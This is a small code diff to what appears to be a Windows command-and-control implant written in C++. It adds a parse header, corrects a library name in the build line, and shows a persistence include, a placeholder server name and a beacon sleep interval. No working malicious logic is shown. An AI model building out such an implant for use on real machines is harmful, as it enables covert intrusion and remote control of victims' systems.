@@ -11,8 +11,9 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <cmath>
 
 #include "persist.h"
+#include "parse.h"
 
-// current compile line is - g++ implant.cpp persist.cpp -lwinhttp -lbscrypt -static -o implant.exe
+// current compile line is - g++ implant.cpp persist.cpp -lwinhttp -lbcrypt -static -o implant.exe
 
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
